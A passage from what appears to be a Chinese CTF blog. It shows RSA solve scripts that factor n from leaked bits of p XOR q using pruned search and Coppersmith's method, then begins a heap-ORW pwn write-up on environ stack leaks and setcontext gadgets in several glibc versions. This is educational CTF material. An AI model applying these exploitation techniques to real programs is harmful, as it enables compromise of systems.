class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">gift= <span class="number">31958645886829465663742610069283430399728839850513083246386448538197604487936046499520648726337487741518220398603291803472699224153248758152580060648773650158416844012882499079656290683984</span></span><br><span class="line">n= <span class="number">15619505127163351990488112863141770563681865299685335225044672449726679222174346048307947030511199439211424719776067281155135078932581011042086945379010517674964386503132937564666399232773753915118399621574185937509903051039065814343973923020001058435075609186940135177566113588279789880050765917976777441097617047571689871730580173453909325715236673431821153879912252168063435406632373091016998302026085400209541600123918721359539043369121055076362039338053031901425283160162332806529991986251686578951231643999424466225561068669799631709183429733152004160441220955561218225125773530257724062784558011621107619960331</span></span><br><span class="line">c= <span class="number">5265044898684398200513906083356703459876884038316945972785773883929874451990761745669452129171819134620745907830964766040424898002648481947297293242536080478374906513529238083909508902829410210784413646328197032379795305874547377474243240849178748210770629567973487901163276011693717054581720387087565368827406564018666754977477364832065988106365591859733598683183313263133882321735804828207940650807293882383692341076382872724971004960700289433466846333180494480231222493734477317628426618535134595262632520744157878280876244576396437437202332728155506177243283113630607686326730151811058616601645253399574984429323</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(gift).bit_length())</span><br><span class="line">xor_p_q = <span class="built_in">bin</span>(gift)[<span class="number">2</span>:].zfill(<span class="number">624</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(xor_p_q))</span><br><span class="line"><span class="built_in">print</span>(xor_p_q)</span><br><span class="line">p_count = []</span><br><span class="line">bit = <span class="number">624</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n_x.bit_length())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">p,q</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(p)</span><br><span class="line">    p_min = p + <span class="string">&#x27;0&#x27;</span>*(<span class="number">1024</span>-length)</span><br><span class="line">    p_max = p + <span class="string">&#x27;1&#x27;</span>*(<span class="number">1024</span>-length)</span><br><span class="line">    q_min = q + <span class="string">&#x27;0&#x27;</span>*(<span class="number">1024</span>-length)</span><br><span class="line">    q_max = q + <span class="string">&#x27;1&#x27;</span>*(<span class="number">1024</span>-length)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(p_min,<span class="number">2</span>) &lt; <span class="built_in">int</span>(q_min,<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(p_min,<span class="number">2</span>)*<span class="built_in">int</span>(q_min,<span class="number">2</span>) &gt; n:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(p_max,<span class="number">2</span>)*<span class="built_in">int</span>(q_max,<span class="number">2</span>) &lt; n:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">624</span>:</span><br><span class="line">        p_count.append(<span class="built_in">int</span>(p,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> xor_p_q[length]==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            find(p+<span class="string">&quot;0&quot;</span>,q+<span class="string">&quot;0&quot;</span>)</span><br><span class="line">            find(p+<span class="string">&quot;1&quot;</span>,q+<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            find(p+<span class="string">&quot;0&quot;</span>,q+<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            find(p+<span class="string">&quot;1&quot;</span>,q+<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;&quot;</span></span><br><span class="line">q = <span class="string">&quot;&quot;</span></span><br><span class="line">find(p,q)</span><br><span class="line"><span class="built_in">print</span>(p_count)</span><br></pre></td></tr></table></figure><ul><li>接下来就是使用<code>Coppersmith</code>攻击求得p的完整位了。最终的exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">gift= <span class="number">31958645886829465663742610069283430399728839850513083246386448538197604487936046499520648726337487741518220398603291803472699224153248758152580060648773650158416844012882499079656290683984</span></span><br><span class="line">n= <span class="number">15619505127163351990488112863141770563681865299685335225044672449726679222174346048307947030511199439211424719776067281155135078932581011042086945379010517674964386503132937564666399232773753915118399621574185937509903051039065814343973923020001058435075609186940135177566113588279789880050765917976777441097617047571689871730580173453909325715236673431821153879912252168063435406632373091016998302026085400209541600123918721359539043369121055076362039338053031901425283160162332806529991986251686578951231643999424466225561068669799631709183429733152004160441220955561218225125773530257724062784558011621107619960331</span></span><br><span class="line">c= <span class="number">5265044898684398200513906083356703459876884038316945972785773883929874451990761745669452129171819134620745907830964766040424898002648481947297293242536080478374906513529238083909508902829410210784413646328197032379795305874547377474243240849178748210770629567973487901163276011693717054581720387087565368827406564018666754977477364832065988106365591859733598683183313263133882321735804828207940650807293882383692341076382872724971004960700289433466846333180494480231222493734477317628426618535134595262632520744157878280876244576396437437202332728155506177243283113630607686326730151811058616601645253399574984429323</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(gift).bit_length())</span><br><span class="line">xor_p_q = <span class="built_in">bin</span>(gift)[<span class="number">2</span>:].zfill(<span class="number">624</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(xor_p_q))</span><br><span class="line"><span class="built_in">print</span>(xor_p_q)</span><br><span class="line">p_count = []</span><br><span class="line">bit = <span class="number">624</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n_x.bit_length())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">p,q</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(p)</span><br><span class="line">    p_min = p + <span class="string">&#x27;0&#x27;</span>*(<span class="number">1024</span>-length)</span><br><span class="line">    p_max = p + <span class="string">&#x27;1&#x27;</span>*(<span class="number">1024</span>-length)</span><br><span class="line">    q_min = q + <span class="string">&#x27;0&#x27;</span>*(<span class="number">1024</span>-length)</span><br><span class="line">    q_max = q + <span class="string">&#x27;1&#x27;</span>*(<span class="number">1024</span>-length)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(p_min,<span class="number">2</span>) &lt; <span class="built_in">int</span>(q_min,<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(p_min,<span class="number">2</span>)*<span class="built_in">int</span>(q_min,<span class="number">2</span>) &gt; n:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(p_max,<span class="number">2</span>)*<span class="built_in">int</span>(q_max,<span class="number">2</span>) &lt; n:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">624</span>:</span><br><span class="line">        p_count.append(<span class="built_in">int</span>(p,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> xor_p_q[length]==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            find(p+<span class="string">&quot;0&quot;</span>,q+<span class="string">&quot;0&quot;</span>)</span><br><span class="line">            find(p+<span class="string">&quot;1&quot;</span>,q+<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            find(p+<span class="string">&quot;0&quot;</span>,q+<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            find(p+<span class="string">&quot;1&quot;</span>,q+<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;&quot;</span></span><br><span class="line">q = <span class="string">&quot;&quot;</span></span><br><span class="line">find(p,q)</span><br><span class="line"><span class="comment">#print(p_count)</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(p_count,leave=<span class="string">&quot;true&quot;</span>):</span><br><span class="line">    f = i*(<span class="number">2</span>^<span class="number">400</span>) + x</span><br><span class="line">    f = f.monic()</span><br><span class="line">    result = f.small_roots(X=<span class="number">2</span>^<span class="number">400</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        p = <span class="built_in">int</span>(f(result[<span class="number">0</span>]))</span><br><span class="line">        q = n//p</span><br><span class="line">        phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = inverse_mod(e,phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        flag = libnum.n2s(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 56006392793428031098528164046902473735914942472421571736913862629536737626781484473455349368097236605</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;bf9479c1-d113-4a22-8635-eff7d74aeaff&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="题型3_已知n和pq的低位"><a class="markdownIt-Anchor" href="#题型3_已知n和pq的低位"></a> 题型3_已知n和p^q的低位</h1><ul><li>该题型与题型3比较相似，都是泄露部分位，但是该题型需要从低位搜索，因为高位是未知的，所以比较的必须是n的低位，所以在与n比较的时候，我们需要对n进行模操作。</li><li>题目如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid4()).encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = p * q</span><br><span class="line">leak = (p ^ q) % <span class="number">2</span>**<span class="number">412</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak = <span class="subst">&#123;leak&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 100067171215784436922726116667829636101749904813139264812522764457839791326558303122342640996637017743078254406667808278471432173199869414158634259101208840509206943398696427874670443166642119337187949569578775835261382262934419063527840553058604243362595487934302573649900855427025107244675713231876070288113</span></span><br><span class="line"><span class="string">leak = 10543832115168186473789693511591064003599011911243189606838628791917775426849764109796961711367962396680258737918389765791736</span></span><br><span class="line"><span class="string">c= 80814331464810597768737366158891960237333475871335064565579754621450945292918227366788544042379458885165286365172544344865464054423301878576663429241721492502024564913646743967814247446096208328410179346145050571335354785914338284241561040442534786615044961507831039886737797898408428067352230443860691411097</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">100067171215784436922726116667829636101749904813139264812522764457839791326558303122342640996637017743078254406667808278471432173199869414158634259101208840509206943398696427874670443166642119337187949569578775835261382262934419063527840553058604243362595487934302573649900855427025107244675713231876070288113</span></span><br><span class="line">leak = <span class="number">10543832115168186473789693511591064003599011911243189606838628791917775426849764109796961711367962396680258737918389765791736</span></span><br><span class="line">c= <span class="number">80814331464810597768737366158891960237333475871335064565579754621450945292918227366788544042379458885165286365172544344865464054423301878576663429241721492502024564913646743967814247446096208328410179346145050571335354785914338284241561040442534786615044961507831039886737797898408428067352230443860691411097</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(leak.bit_length())</span><br><span class="line">p_xor_q = <span class="built_in">bin</span>(leak)[<span class="number">2</span>:].zfill(<span class="number">412</span>)</span><br><span class="line"><span class="built_in">print</span>(p_xor_q)</span><br><span class="line">x = []</span><br><span class="line">bit = <span class="number">412</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">p,q</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(p)</span><br><span class="line">    tmp1 = <span class="built_in">int</span>(p,<span class="number">2</span>) <span class="keyword">if</span> p <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    tmp2 = <span class="built_in">int</span>(q,<span class="number">2</span>) <span class="keyword">if</span> q <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    tmp3 = tmp1*tmp2 % <span class="number">2</span>^length</span><br><span class="line">    <span class="comment">#print(tmp1.bit_length())</span></span><br><span class="line">    <span class="keyword">if</span> tmp3 != n % <span class="number">2</span>^length:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">412</span>:</span><br><span class="line">        x.append(<span class="built_in">int</span>(p,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> p_xor_q[bit-<span class="number">1</span>-length] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            find(<span class="string">&quot;1&quot;</span>+p,<span class="string">&quot;0&quot;</span>+q)</span><br><span class="line">            find(<span class="string">&quot;0&quot;</span>+p,<span class="string">&quot;1&quot;</span>+q)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            find(<span class="string">&quot;1&quot;</span>+p,<span class="string">&quot;1&quot;</span>+q)</span><br><span class="line">            find(<span class="string">&quot;0&quot;</span>+p,<span class="string">&quot;0&quot;</span>+q)</span><br><span class="line">p = <span class="string">&quot;&quot;</span></span><br><span class="line">q = <span class="string">&quot;&quot;</span></span><br><span class="line">find(p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(x,leave=<span class="string">&quot;true&quot;</span>):</span><br><span class="line">    <span class="comment">#print(i.bit_length())</span></span><br><span class="line">    PR.&lt;y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = y*(<span class="number">2</span>^i.bit_length()) + i</span><br><span class="line">    f = f.monic()</span><br><span class="line">    result = f.small_roots(X=<span class="number">2</span>^(<span class="number">512</span>-i.bit_length()),beta = <span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        p = <span class="built_in">int</span>(result[<span class="number">0</span>]*<span class="number">2</span>^(i.bit_length()) + i)</span><br><span class="line">        <span class="built_in">print</span>(p.bit_length())</span><br><span class="line">        q = n//p</span><br><span class="line">        <span class="built_in">print</span>(q)</span><br><span class="line">        phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d = inverse_mod(e,phi)</span><br><span class="line">            m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;f01c75b0-43d8-40c0-a222-944b1f58c837&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：周末遇到了，就记录下</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆ORW</title>
    <link href="http://iyheart.github.io/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/"/>
    <id>http://iyheart.github.io/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/</id>
    <published>2025-04-23T00:02:32.000Z</published>
    <updated>2025-04-23T00:09:09.682Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>四月份有一场新能源比赛，比赛后向别人要到了<code>PWN</code>的附件，这个比赛只有一题<code>PWN</code>考的是常规的堆题，考的是<code>堆</code>与<code>ORW</code>。第一次接触<code>堆</code>与<code>ORW</code>的结合的题型。所以就认真做了一下。</p></li><li><p><strong>堆</strong>与<strong>ORW</strong>相结合的题目，与栈溢出的<code>ORW</code>最后的套路基本一样，都是要构造<code>ROP</code>链，或者写<code>shellcode</code>。</p><ul><li>那么问题来了<strong>栈溢出</strong>类型的ORW很好写ROP链，因为可以劫持返回地址，也可以进行栈迁移构造ROP链。</li><li>而堆与ORW相结合的这类题型，构造ROP链就成了一个问题，因为我们不知道栈地址，劫持返回地址还比较困难。</li><li>但是堆与ORW相结合的题型基本上还是<strong>构造ROP链</strong>或者是<strong>利用栈迁移构造ROP链</strong>。<ul><li>在原来的栈上构造ROP链之前，我们还需要<strong>泄露栈地址(利用<code>__envrion</code>全局变量)<strong>以及</strong>任意地址写</strong></li><li>如果使用<strong>栈迁移的构造ROP链</strong>，我们就需要使用<strong>magic gadgets进行栈迁移写ROP</strong>。而这个<code>magic gadgets</code>出现在<strong>setcontext函数</strong>中</li><li>有的题目可能还可以构造<strong>SROP</strong>链。</li><li>还有的题目需要利用<strong>IO_FILE</strong></li></ul></li></ul></li><li><p>以上就是<strong>堆</strong>与<strong>ORW</strong>相结合题目的利用思路，接下来先介绍一下前俩个利用思路中的<code>__envrion全局变量</code>和<code>setcontext函数中magic gadgets</code></p></li></ul><h1 id="envrion和setcontext"><a class="markdownIt-Anchor" href="#envrion和setcontext"></a> envrion和setcontext</h1><h2 id="envrion全局变量"><a class="markdownIt-Anchor" href="#envrion全局变量"></a> envrion全局变量</h2><ul><li>注意<code>envrion</code>是一个全局变量，并不是一个函数，我在做题的时候一开始误将<code>envrion</code>看成是一个函数，劫持了<code>__free_hook()</code>为该全局变量的地址，导致在exp利用的时候出现了问题。之后才反应过来这时一个<strong>全局变量</strong></li><li><code>envrion</code>全局变量是在<code>glibc</code>中，它保存了<strong>当前进程的环境变量</strong>列表，而环境变量列表会在一开始执行程序时被压入栈中。而<code>envrion</code>这个全局变量是一个指针，指向的就是<code>环境变量列表</code>所在的栈地址。</li><li><code>envrion</code>这个全局变量一般是这样定义的：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br></pre></td></tr></table></figure><ul><li>我们的环境变量列表一般如下图所示：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;PATH=/usr/bin:/bin&quot;</span></span><br><span class="line"><span class="string">&quot;HOME=/home/username&quot;</span></span><br><span class="line"><span class="string">&quot;SHELL=/bin/bash&quot;</span></span><br></pre></td></tr></table></figure><ul><li>接下来我们使用一个示例程序，通过调试查看一下<code>environ</code>这个值。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **__environ;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,__environ);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc ./environ.c -o environ</span></span><br></pre></td></tr></table></figure><ul><li>接下来我们gdb动态调试看看，先查看栈上的这个位置。</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250419005122531.png" alt="image-20250419005122531"></p><ul><li>然后我们再来看<code>printf()</code>函数的第二个参数，就会发现第二个参数输出的就是<code>0x7fffcbcf4fc8</code>这个栈地址</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250419005223655.png" alt="image-20250419005223655"></p><ul><li>此时我们利用<strong>堆溢出</strong>、<strong>UAF漏洞</strong>、<strong>堆风水</strong>实现任意地址泄露，我们就可以泄露出栈上的地址，之后我们再利用任意地址写，就可以在栈上构造ROP链了还可以调用mprotect函数然后向指定地址写入shellcode进行ORW操作。</li></ul><h2 id="setcontext函数"><a class="markdownIt-Anchor" href="#setcontext函数"></a> setcontext函数</h2><ul><li><p>现在也来了解一下<strong>setcontext函数中的magic_gadgets</strong>。接下来简单介绍一下这个函数。</p></li><li><p><code>setcontext</code> 是 <code>glibc</code> 中提供的一个<strong>上下文切换函数</strong>，属于 POSIX 的用户级上下文（User Context） API，主要用于用户空间实现<strong>协程</strong>、<strong>线程切换</strong>、<strong>信号恢复</strong>、<strong>非局部跳转</strong>等功能。注意：<strong>这个与SROP非常像</strong></p></li><li><p>这个函数做个简单了解就行，我们主要使用的就是这个函数里面的一小段汇编，也就是我们所说的<code>magic_gadgets</code>。<code>setcontext</code>这个函数的<code>magic_gadgets</code>主要以<code>glibc2.27</code>、<code>glibc2.29</code>、<code>glibc2.31</code>这三个版本为分界线。</p></li><li><p>我们先来说<code>glibc2.27</code>及<code>glibc2.27</code>之前的版本，在执行这个函数的时候，我们会发现有进行一次<code>syscall 0xE</code>的系统调用，之后就是将<code>[rdi+0xA0]</code>位置一系列的值都给寄存器。这就相当于我们在用户层面使用<code>SROP</code>（<strong>真正的SROP调用是在内核层面</strong>）。</p><ul><li>此时我们就可以控制<strong>RSP、RBP</strong>这俩个指针。这样我们就可以直接进行栈迁移操作。</li><li>并且由于是将<code>[rdi+0x]</code>的值赋值给寄存器，也就是<code>rdi</code>寄存器指向的内存地址中的数据，这时我们就可以配合着<code>__free_hook</code>进行使用，在堆上布置寄存器的值</li></ul></li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250419015858274.png" alt="image-20250419015858274"></p><ul><li>我们再来说明一下<code>glibc2.27</code>以后的版本，这个是<code>glibc2.29</code>的版本，我们发现<code>glibc2.29</code>的这个版本<code>setcontext</code>中的<code>magic gadget</code>原本的<code>rdi</code>被替换成了<code>rdx</code>，此时我们就不能使用<code>__free_hook</code>直接对这个程序进行控制</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421083043144.png" alt="image-20250421083043144"></p><ul><li>这个时候我们就需要用上其他的<code>gadget</code>，这时我们先使用<code>__free_hook</code>将程序执行流执行到下面的<code>gadget</code>，之后再调用<code>setcontext</code></li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421083306689.png" alt="image-20250421083306689"></p><ul><li>接下来查看<code>glibc2.31</code>的<code>magic gadget</code>，我们发现这个<code>magic gadget</code>由原来的<code>setcontext+53</code>变成了<code>setcontext+61</code></li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421083709715.png" alt="image-20250421083709715"></p><ul><li>并且原来的<code>glibc2.29</code>的<code>gadget</code>已经删除了只剩一个，如下图所示</li></ul><p><img src="/2025/04/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86ORW/image-20250421083915447.png" alt="image-20250421083915447"></p><h1 id="利用envrion"><a class="markdownIt-Anchor" href="#利用envrion"></a> 利用envrion</h1><ul><li>接下来我们就利用新能源网络CTF的这题，简单介绍一下利用<code>envrion</code>泄露栈地址进行<code>orw</code>的操作。</li></ul><h2 id="cfc_level_1"><a class="markdownIt-Anchor" href="#cfc_level_1"></a> 